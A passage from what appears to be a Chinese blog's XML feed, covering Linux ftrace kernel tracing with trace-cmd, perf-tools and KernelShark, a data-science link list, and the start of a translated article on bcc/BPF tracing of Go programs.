kprobes</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 vmmemctl</span><br><span class="line">/sys/kernel/debug/tracing<span class="comment"># ls -lrt</span></span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 tracing_thresh</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 tracing_on</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 tracing_max_latency</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 tracing_enabled</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 tracing_cpumask</span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 trace_stat</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 trace_pipe</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 trace_options</span><br><span class="line">--w--w----.  1 root root 0 12月 28 17:24 trace_marker</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 trace_clock</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 trace</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 sysprof_sample_period</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 set_graph_function</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 set_ftrace_pid</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 set_ftrace_notrace</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 saved_cmdlines</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 README</span><br><span class="line">drwxr-xr-x.  2 root root 0 12月 28 17:24 options</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 function_profile_enabled</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 dyn_ftrace_total_info</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 buffer_size_kb</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 available_tracers</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 available_filter_functions</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 set_event</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 printk_formats</span><br><span class="line">drwxr-xr-x. 34 root root 0 12月 28 17:24 per_cpu</span><br><span class="line">drwxr-xr-x. 24 root root 0 12月 28 17:24 events</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 available_events</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 kprobe_profile</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 kprobe_events</span><br><span class="line">-r--r--r--.  1 root root 0 12月 28 17:24 stack_trace</span><br><span class="line">-rw-r--r--.  1 root root 0 12月 28 17:24 stack_max_size</span><br><span class="line">-rw-r--r--.  1 root root 0 5月  31 11:50 current_tracer</span><br><span class="line">-rwxr-xr-x.  1 root root 0 5月  31 11:57 set_ftrace_filter</span><br></pre></td></tr></table></figure></p>
<h2 id="三、BASIC"><a href="#三、BASIC" class="headerlink" title="三、BASIC"></a>三、BASIC</h2><h3 id="1-Function-tracer"><a href="#1-Function-tracer" class="headerlink" title="1. Function tracer"></a>1. Function tracer</h3><p>以Function tracer为例，结果存储在 <strong>trace</strong>，该文件类似一张报表，该表将显示 4 列信息。首先是进程信息，包括进程名和PID ；第二列是CPU；第三列是时间戳；第四列是函数信息，缺省情况下，这里将显示内核函数名以及它的上一层调用函数。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">cd /sys/kernel/debug/tracing</span><br><span class="line">echo function &gt; current_tracer</span><br><span class="line">cat trace</span><br><span class="line"></span><br><span class="line"># tracer: function</span><br><span class="line">#</span><br><span class="line">#  TASK-PID   CPU#  TIMESTAMP        FUNCTION</span><br><span class="line">#   |  |       |  </span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088308</span>: _spin_lock &lt;-hrtimer_interrupt</span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088308</span>: ktime_get_update_offsets &lt;-hrtimer_interrupt</span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088309</span>: __run_hrtimer &lt;-hrtimer_interrupt</span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088309</span>: __remove_hrtimer &lt;-__run_hrtimer</span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088309</span>: tick_sched_timer &lt;-__run_hrtimer</span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088309</span>: ktime_get &lt;-tick_sched_timer</span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088310</span>: tick_do_update_jiffies64 &lt;-tick_sched_timer</span><br><span class="line">gmond<span class="number">-6684</span>  [<span class="number">004</span>] <span class="number">13285965.088310</span>: update_process_times &lt;-tick_sched_timer</span><br></pre></td></tr></table></figure>
<h3 id="2-Function-graph-tracer"><a href="#2-Function-graph-tracer" class="headerlink" title="2. Function graph tracer"></a>2. Function graph tracer</h3><p>Function graph tracer 和 function tracer 类似，但输出为函数调用图，更加容易阅读：<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># tracer: function_graph</span><br><span class="line">#</span><br><span class="line">#     TIME        CPU  DURATION                  FUNCTION CALLS</span><br><span class="line">#      |          |     |   |                     |   |   |   |</span><br><span class="line"> <span class="number">21</span>)   ==========&gt; |</span><br><span class="line"> <span class="number">21</span>)               |  smp_apic_timer_interrupt() &#123;</span><br><span class="line"> <span class="number">31</span>)   ==========&gt; |</span><br><span class="line"> <span class="number">31</span>)               |  smp_apic_timer_interrupt() &#123;</span><br><span class="line"> <span class="number">8</span>)               |  smp_apic_timer_interrupt() &#123;</span><br><span class="line"> <span class="number">11</span>)   <span class="number">2.598</span> us    |    native_apic_mem_write();</span><br><span class="line"> <span class="number">18</span>)   <span class="number">3.106</span> us    |    native_apic_mem_write();</span><br><span class="line"> <span class="number">30</span>)   ==========&gt; |</span><br><span class="line"> <span class="number">30</span>)               |  smp_apic_timer_interrupt() &#123;</span><br><span class="line">  <span class="number">3</span>)   <span class="number">3.590</span> us    |    native_apic_mem_write();</span><br><span class="line"> <span class="number">22</span>)   <span class="number">2.944</span> us    |    native_apic_mem_write();</span><br><span class="line">  <span class="number">7</span>)   <span class="number">3.392</span> us    |    native_apic_mem_write();</span><br><span class="line"> <span class="number">17</span>)   ==========&gt; |</span><br><span class="line"> <span class="number">17</span>)               |  smp_apic_timer_interrupt() &#123;</span><br><span class="line"> <span class="number">27</span>)   ==========&gt; |</span><br><span class="line"> <span class="number">27</span>)               |  smp_apic_timer_interrupt() &#123;</span><br><span class="line"> <span class="number">16</span>)   ==========&gt; |</span><br><span class="line"> <span class="number">16</span>)               |  smp_apic_timer_interrupt() &#123;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTrace_ftrace_tracers.png" alt="Linux ftrace tracers"></p>
<h2 id="四、体系结构"><a href="#四、体系结构" class="headerlink" title="四、体系结构"></a>四、体系结构</h2><p>Ftrace有两大组成部分，framework和一系列的tracer 。每个tracer完成不同的功能，它们统一由framework管理。 ftrace 的trace信息保存在ring buffer中，由framework负责管理。Framework 利用debugfs建立tracing目录，并提供了一系列的控制文件。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTrace_ftrace_arch.png" alt="Linux ftrace架构示意图"></p>
<p><strong>ftrace is a dynamic tracing system.</strong> 当你开始“ftracing”一个内核函数的时候，该函数的代码实际上就已经发生变化了。内核将在程序集中插入一些额外的指令，使得函数调用时可以随时通知追踪程序。</p>
<blockquote>
<p>WARNNING:使用ftrace追踪内核将有可能对系统性能产生影响，追踪的函数越多，开销越大。<br>使用者必须提前做好准备工作，生产环境必须谨慎使用。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat available_tracers //查看支持的tracers</span></span><br><span class="line">blk kmemtrace function_graph wakeup_rt wakeup <span class="keyword">function</span> sysprof sched_switch initcall nop</span><br></pre></td></tr></table></figure>
<h2 id="五、Useful-Tools"><a href="#五、Useful-Tools" class="headerlink" title="五、Useful Tools"></a>五、Useful Tools</h2><h3 id="1-trace-cmd"><a href="#1-trace-cmd" class="headerlink" title="1. trace-cmd"></a>1. trace-cmd</h3><p>trace-cmd是一个非常有用的Ftrace命令行工具。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install trace-cmd</span><br><span class="line">或者</span><br><span class="line">git <span class="built_in">clone</span> git://git.kernel.org/pub/scm/linux/kernel/git/rostedt/trace-cmd.git</span><br></pre></td></tr></table></figure><br>使用方法：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo trace-cmd record --<span class="built_in">help</span> <span class="comment">#help</span></span><br><span class="line">sudo trace-cmd record -p <span class="keyword">function</span> -P 123456 <span class="comment">#record for PID</span></span><br><span class="line">sudo trace-cmd record -p <span class="keyword">function</span> -l do_page_fault <span class="comment">#record for function</span></span><br><span class="line">  plugin <span class="string">&#x27;function&#x27;</span></span><br><span class="line">Hit Ctrl^C to stop recording</span><br></pre></td></tr></table></figure><br>trace.dat<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ sudo trace-cmd report</span><br><span class="line">          chrome<span class="number">-15144</span> [<span class="number">000</span>] <span class="number">11446.466121</span>: function:             do_page_fault</span><br><span class="line">          chrome<span class="number">-15144</span> [<span class="number">000</span>] <span class="number">11446.467910</span>: function:             do_page_fault</span><br><span class="line">          chrome<span class="number">-15144</span> [<span class="number">000</span>] <span class="number">11446.469174</span>: function:             do_page_fault</span><br><span class="line">          chrome<span class="number">-15144</span> [<span class="number">000</span>] <span class="number">11446.474225</span>: function:             do_page_fault</span><br><span class="line">          chrome<span class="number">-15144</span> [<span class="number">000</span>] <span class="number">11446.474386</span>: function:             do_page_fault</span><br><span class="line">          chrome<span class="number">-15144</span> [<span class="number">000</span>] <span class="number">11446.478768</span>: function:             do_page_fault</span><br><span class="line"> CompositorTileW<span class="number">-15154</span> [<span class="number">001</span>] <span class="number">11446.480172</span>: function:             do_page_fault</span><br><span class="line">          chrome<span class="number">-1830</span>  [<span class="number">003</span>] <span class="number">11446.486696</span>: function:             do_page_fault</span><br><span class="line"> CompositorTileW<span class="number">-15154</span> [<span class="number">001</span>] <span class="number">11446.488983</span>: function:             do_page_fault</span><br><span class="line"> CompositorTileW<span class="number">-15154</span> [<span class="number">001</span>] <span class="number">11446.489034</span>: function:             do_page_fault</span><br><span class="line"> CompositorTileW<span class="number">-15154</span> [<span class="number">001</span>] <span class="number">11446.489045</span>: function:             do_page_fault</span><br></pre></td></tr></table></figure></p>
<p>在很有情况下不能使用函数追踪，需要依赖 <strong>事件追踪</strong> 的支持，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat available_events  //查看支持的事件类型</span></span><br><span class="line">power:power_start</span><br><span class="line">power:power_frequency</span><br><span class="line">power:power_end</span><br><span class="line"></span><br><span class="line"><span class="built_in">sched</span>:sched_kthread_stop</span><br><span class="line"><span class="built_in">sched</span>:sched_kthread_stop_ret</span><br><span class="line"><span class="built_in">sched</span>:sched_wait_task</span><br><span class="line"><span class="built_in">sched</span>:sched_wakeup</span><br><span class="line"><span class="built_in">sched</span>:sched_wakeup_new</span><br><span class="line"><span class="built_in">sched</span>:sched_switch</span><br><span class="line"><span class="built_in">sched</span>:sched_migrate_task</span><br><span class="line"><span class="built_in">sched</span>:sched_process_free</span><br><span class="line"><span class="built_in">sched</span>:sched_process_exit</span><br><span class="line"><span class="built_in">sched</span>:sched_process_wait</span><br><span class="line"><span class="built_in">sched</span>:sched_process_fork</span><br><span class="line"><span class="built_in">sched</span>:sched_stat_wait</span><br><span class="line"><span class="built_in">sched</span>:sched_stat_sleep</span><br><span class="line"><span class="built_in">sched</span>:sched_stat_iowait</span><br><span class="line"><span class="built_in">sched</span>:sched_stat_runtime</span><br><span class="line"></span><br><span class="line">sudo trace-cmd record -e <span class="built_in">sched</span>:sched_switch</span><br><span class="line">sudo trace-cmd report</span><br></pre></td></tr></table></figure>
<p>输出如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">16169.624862:   Chrome_ChildIOT:24817 [112] S ==&gt; chrome:15144 [120]</span><br><span class="line">16169.624992:   chrome:15144 [120] S ==&gt; swapper/3:0 [120]</span><br><span class="line">16169.625202:   swapper/3:0 [120] R ==&gt; Chrome_ChildIOT:24817 [112]</span><br><span class="line">16169.625251:   Chrome_ChildIOT:24817 [112] R ==&gt; chrome:1561 [112]</span><br><span class="line">16169.625437:   chrome:1561 [112] S ==&gt; chrome:15144 [120]</span><br></pre></td></tr></table></figure><br>切换路径：PID 24817 -&gt; 15144 -&gt; kernel -&gt; 24817 -&gt; 1561 -&gt; 15114。</p>
<h3 id="2-perf-tools"><a href="#2-perf-tools" class="headerlink" title="2. perf-tools"></a>2. perf-tools</h3><p><strong>perf-tools</strong> 是性能调试大神Brendan Gregg开发的一个工具包，提供了很多强大的功能，例如：<br>iosnoop: 磁盘I/O分析详细包括延迟<br>iolatency: 磁盘I/O分析概要(柱状图)<br>execsnoop: 追踪进程exec()<br>opensnoop: 追踪open()系统调用，包含文件名<br>killsnoop: 追踪kill()信号（进程和信号详细）</p>
<p>代码下载：<a href="https://github.com/brendangregg/perf-tools">https://github.com/brendangregg/perf-tools</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./execsnoop  //显示新进程和参数：</span></span><br><span class="line">Tracing <span class="built_in">exec</span>()s. Ctrl-C to end.</span><br><span class="line">   PID   PPID ARGS</span><br><span class="line"> 22898  22004 man ls</span><br><span class="line"> 22905  22898 preconv -e UTF-8</span><br><span class="line"> 22908  22898 pager -s</span><br><span class="line"> 22907  22898 nroff -mandoc -rLL=164n -rLT=164n -Tutf8</span><br><span class="line"> 22906  22898 tbl</span><br><span class="line"> 22911  22910 locale charmap</span><br><span class="line"> 22912  22907 groff -mtty-char -Tutf8 -mandoc -rLL=164n -rLT=164n</span><br><span class="line"> 22913  22912 troff -mtty-char -mandoc -rLL=164n -rLT=164n -Tutf8</span><br><span class="line"> 22914  22912 grotty</span><br><span class="line"></span><br><span class="line"><span class="comment"># ./iolatency -Q  //测量设备I/O延迟</span></span><br><span class="line">Tracing block I/O. Output every 1 seconds. Ctrl-C to end.</span><br><span class="line">  &gt;=(ms) .. &lt;(ms)   : I/O      |Distribution                          |</span><br><span class="line">       0 -&gt; 1       : 1913     |<span class="comment">######################################|</span></span><br><span class="line">       1 -&gt; 2       : 438      |<span class="comment">#########                             |</span></span><br><span class="line">       2 -&gt; 4       : 100      |<span class="comment">##                                    |</span></span><br><span class="line">       4 -&gt; 8       : 145      |<span class="comment">###                                   |</span></span><br><span class="line">       8 -&gt; 16      : 43       |<span class="comment">#                                     |</span></span><br><span class="line">      16 -&gt; 32      : 43       |<span class="comment">#                                     |</span></span><br><span class="line">      32 -&gt; 64      : 1        |<span class="comment">#                                     |</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<h2 id="六、可视化工具-KernelShark"><a href="#六、可视化工具-KernelShark" class="headerlink" title="六、可视化工具:KernelShark"></a>六、可视化工具:KernelShark</h2><p>KernelShark是trace-cmd的前端工具，提供了对trace.dat的可视化分析（Graph View 、List View、Simple and Advance filtering）。<br><img src="https://static.lwn.net/images/2011/ks-success-zoom-task.png" alt="Linux ftrace KernelShark"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTrace_ftrace_KernelShark_Filters.png" alt="Linux ftrace KernelShark Filters"></p>
<h2 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://jvns.ca/blog/2017/03/19/getting-started-with-ftrace/">(Key)Julia Evans:ftrace: trace your kernel functions!</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-ftrace/">(Key)IBM developerWorks@刘明：ftrace简介,2009</a></li>
<li><a href="https://lwn.net/Articles/365835/">Debugging the kernel using Ftrace - part 1 (Dec 2009, Steven Rostedt)</a></li>
<li><a href="https://lwn.net/Articles/366796/">Debugging the kernel using Ftrace - part 2 (Dec 2009, Steven Rostedt</a></li>
<li><a href="https://lwn.net/Articles/370423/">Secrets of the Linux function tracer (Jan 2010, Steven Rostedt)</a></li>
<li><a href="https://lwn.net/Articles/410200/">trace-cmd: A front-end for Ftrace (Oct 2010, Steven Rostedt)</a></li>
<li><a href="https://lwn.net/Articles/425583/">Using KernelShark to analyze the real-time scheduler (2011, Steven Rostedt)</a></li>
<li><a href="https://lwn.net/Articles/608497/">Ftrace: The hidden light switch (2014, Brendan Gregg)</a></li>
<li><a href="https://www.kernel.org/doc/Documentation/trace/ftrace.txt">(Key)the kernel documentation:ftrace.txt</a></li>
<li><a href="">documentation on events you can trace Documentation/events.txt</a></li>
<li><a href="">some docs on ftrace design for linux kernel devs (not as useful, but interesting)</a></li>
<li><a href="">Documentation/ftrace-design.txt</a></li>
<li><a href="http://rostedt.homelinux.com/kernelshark/">trace-cmd图形化工具：KernelShark</a></li>
<li><a href="https://www.youtube.com/watch?v=ABRtzVtUVBo">Youtube:ELC2011 Ftrace GUI (KernelShark)</a></li>
<li><a href="http://elinux.org/images/6/64/Elc2011_rostedt.pdf">(Key)StevenRostedt:ELC2011_KernelShark(quick tutorial)(PDF)</a></li>
</ul>
<p><a href="https://riboseyim.github.io/">source:https://riboseyim.github.io/</a></p>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title>数据科学专题 | Overview of Data Science</title>
    <url>/2019/01/09/Data-Science/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>数据科学工具箱 | Data Science Toolbox</li>
</ul>
<a id="more"></a>
<h2 id="数据科学工具箱"><a href="#数据科学工具箱" class="headerlink" title="数据科学工具箱"></a>数据科学工具箱</h2><h4 id="Data-Science-Toolbox"><a href="#Data-Science-Toolbox" class="headerlink" title="Data Science Toolbox"></a>Data Science Toolbox</h4><ul>
<li><a href="https://www.datascienceatthecommandline.com/index.html" target="_blank" rel="noopener">Data Science at the Command Line | Jeroen Janssens</a></li>
<li><a href="http://www.ituring.com.cn/book/1539" target="_blank" rel="noopener">命令行中的数据科学| Jeroen Janssens (作者) 王晓伟 , 刘峰 (译者)</a></li>
</ul>
<h4 id="Obtainging-Data-数据获取"><a href="#Obtainging-Data-数据获取" class="headerlink" title="Obtainging Data | 数据获取"></a>Obtainging Data | 数据获取</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h4 id="Scrubbing-Data-数据清洗"><a href="#Scrubbing-Data-数据清洗" class="headerlink" title="Scrubbing Data | 数据清洗"></a>Scrubbing Data | 数据清洗</h4><ul>
<li>Drake  </li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Factual/drake.git</span><br></pre></td></tr></table></figure>
<h4 id="Exploring-Data-数据探索"><a href="#Exploring-Data-数据探索" class="headerlink" title="Exploring Data | 数据探索"></a>Exploring Data | 数据探索</h4><ul>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
</ul>
<h4 id="Data-Visualization-数据可视化"><a href="#Data-Visualization-数据可视化" class="headerlink" title="Data Visualization | 数据可视化"></a><a href="https://riboseyim.github.io/2017/07/06/Visualization/" target="_blank" rel="noopener">Data Visualization | 数据可视化</a></h4><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
</ul>
<h4 id="Modeling-Data-数据建模"><a href="#Modeling-Data-数据建模" class="headerlink" title="Modeling Data | 数据建模"></a>Modeling Data | 数据建模</h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>DataScience</tag>
      </tags>
  </entry>
  <entry>
    <title>动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪</title>
    <url>/2017/06/27/DTrace_bcc/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>原文：<a href="http://www.brendangregg.com/blog/2017-01-31/golang-bcc-bpf-function-tracing.html">Brendan Gregg’s Blog :《Golang bcc/BPF Function Tracing》，31 Jan 2017</a></li>
<li>引子：gdb、go execution tracer、GODEBUG、gctrace、schedtrace</li>
<li>一、gccgo Function Counting</li>
<li>二、Go gc Function Counting</li>
<li>三、Per-event invocations of a function</li>
<li>四、Interface Arguments</li>
<li>五、Function Latency</li>
<li>六、总结</li>
<li>七、Tips：构建 LLVM 和 Clang 开发工具库</li>
</ul>
<span id="more"></span>
<p>在这篇文章中，我将迅速调研一种跟踪的 Go 程序的新方法：基于 Linux 4.x eBPF 实现动态跟踪。如果你去搜索 Go 和 BPF，你会发现使用 BPF 接口的 Go 语言接口（例如，gobpf）。这不是我所探索的东西：我将使用 BPF 工具实现 Go 应用程序的性能分析和调试。</p>
<p>目前已经有多种调试和追踪 Go 程序的方法，包括但不限于：</p>
<ul>
<li><a href="https://golang.org/doc/gdb">gdb</a></li>
<li><p><a href="https://golang.org/pkg/runtime/trace/">go execution tracer</a> ：用于高层异常和阻塞事件</p>
<blockquote>
<p>Go execution tracer. (import “runtime/trace”)<br>The tracer captures a wide range of execution events like goroutine creation/blocking/unblocking, syscall enter/exit/block, GC-related events, changes of heap size, processor start/stop, etc and writes them to an io.Writer in a compact form. A precise nanosecond-precision timestamp and a stack trace is captured for most events. A trace can be analyzed later with ‘go tool trace’ command.</p>
</blockquote>
</li>
<li><p><strong>GODEBUG</strong> （一个跨平台的Go程序调试工具）、 <strong>gctrace</strong> 和 <strong>schedtrace</strong></p>
</li>
</ul>
<p>BPF 追踪以做很多事，但都有自己的优点和缺点，接下来将详细说明。首先我从一个简单的 Go 程序开始（ hello.go）</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Hello, BPF!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="一、gccgo-Function-Counting"><a href="#一、gccgo-Function-Counting" class="headerlink" title="一、gccgo Function Counting"></a>一、gccgo Function Counting</h2><p>我开始会使用 gccgo 编译，然后使用 Go gc 编译器 。（区别：gccgo 可以生成优化后的二进制文件，但是基于老版本的 Go。）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 编译</span></span><br><span class="line">$ gccgo -o hello hello.go</span><br><span class="line">$ ./hello</span><br><span class="line">Hello, BPF!</span><br></pre></td></tr></table></figure>
<p>现在我将使用 <a href="https://github.com/iovisor/bcc">bcc</a> 工具的 <strong>funccount</strong> 来动态跟踪和计数所有以 “fmt.” 开头的 Go 库函数调用，在另一个终端重新运行 Hello 程序效果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># funccount &#x27;go:fmt.*&#x27;</span></span><br><span class="line">Tracing 160 <span class="built_in">functions</span> <span class="keyword">for</span> <span class="string">&quot;go:fmt.*&quot;</span>... Hit Ctrl-C to end.</span><br><span class="line">^C</span><br><span class="line">FUNC                                    COUNT</span><br><span class="line">fmt..import                                 1</span><br><span class="line">fmt.padString.pN7_fmt.fmt                   1</span><br><span class="line">fmt.fmt_s.pN7_fmt.fmt                       1</span><br><span class="line">fmt.WriteString.pN10_fmt.buffer             1</span><br><span class="line">fmt.free.pN6_fmt.pp                         1</span><br><span class="line">fmt.fmtString.pN6_fmt.pp                    1</span><br><span class="line">fmt.doPrint.pN6_fmt.pp                      1</span><br><span class="line">fmt.init.pN7_fmt.fmt                        1</span><br><span class="line">fmt.printArg.pN6_fmt.pp                     1</span><br><span class="line">fmt.WriteByte.pN10_fmt.buffer               1</span><br><span class="line">fmt.Println                                 1</span><br><span class="line">fmt.truncate.pN7_fmt.fmt                    1</span><br><span class="line">fmt.Fprintln                                1</span><br><span class="line">fmt.<span class="variable">$nested1</span>                                1</span><br><span class="line">fmt.newPrinter                              1</span><br><span class="line">fmt.clearflags.pN7_fmt.fmt                  2</span><br><span class="line">Detaching...</span><br></pre></td></tr></table></figure>
<p>Neat! 输出结果中包含该程序的 <strong>fmt.Println()</strong> 函数调用。</p>
<p>我不需要进入任何特殊的模式才能实现这个效果，对于一个已经在运行的 Go 应用我可以直接开始测量而不需要重启进程。 <strong>So how does it even work?</strong> 这要归功于 <strong>uprobes</strong> ，Linux 3.5 新增的特性，详见<a href="http://www.brendangregg.com/blog/2015-06-28/linux-ftrace-uprobe.html">Linux uprobes: User-Level Dynamic Tracing</a> 。</p>
<blockquote>
<p>It overwrites instructions with a soft interrupt to kernel instrumentation, and reverses the process when tracing has ended.</p>
</blockquote>
<p>gccgo 编译的输出提供一个标准的符号表用于函数查找。在这种情况下，我利用 libgo 当测量工具（假定“lib”在“go:”之前），作为 gccgo 发出的一个二进制动态链接库（libgo 包含 fmt 包）。uprobes 可以连接到已经运行的进程，或者像我现在一样作为一个二进制库，捕捉所有调用自己的进程。</p>
<p>为了提高效率，我在内核上下文中进行函数调用计数，只将计数发送到用户空间。例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ file hello</span><br><span class="line">hello: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">4</span>dc45f1eb023f44ddb32c15bbe0fb4f933e61815, not stripped</span><br><span class="line">$ ls -lh hello</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> bgregg root <span class="number">29</span>K Jan <span class="number">12</span> <span class="number">21</span>:<span class="number">18</span> hello</span><br><span class="line">$ ldd hello</span><br><span class="line">    linux-vdso.so<span class="number">.1</span> =&gt;  (<span class="number">0x00007ffc4cb1a000</span>)</span><br><span class="line">    libgo.so<span class="number">.9</span> =&gt; /usr/lib/x86_64-linux-gnu/libgo.so<span class="number">.9</span> (<span class="number">0x00007f25f2407000</span>)</span><br><span class="line">    libgcc_s.so<span class="number">.1</span> =&gt; /lib/x86_64-linux-gnu/libgcc_s.so<span class="number">.1</span> (<span class="number">0x00007f25f21f1000</span>)</span><br><span class="line">    libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f25f1e27000</span>)</span><br><span class="line">    /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x0000560b44960000</span>)</span><br><span class="line">    libpthread.so<span class="number">.0</span> =&gt; /lib/x86_64-linux-gnu/libpthread.so<span class="number">.0</span> (<span class="number">0x00007f25f1c0a000</span>)</span><br><span class="line">    libm.so<span 